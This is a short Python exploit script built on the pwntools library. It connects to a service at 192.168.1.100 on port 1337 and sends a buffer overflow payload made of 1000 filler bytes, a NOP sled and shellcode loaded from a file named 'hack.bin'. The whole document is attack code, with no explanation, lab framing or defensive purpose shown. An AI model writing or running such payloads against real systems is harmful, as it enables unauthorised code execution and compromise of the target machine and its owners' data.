from pwn import *

host = '192.168.1.100'
port = 1337

with open('hack.bin', 'rb') as f:
    shellcode = f.read()

conn = remote(host, port)

payload = b"A" * 1000
payload += b"\x90" * 16
payload += shellcode

conn.sendline(payload)
print(conn.recvall())
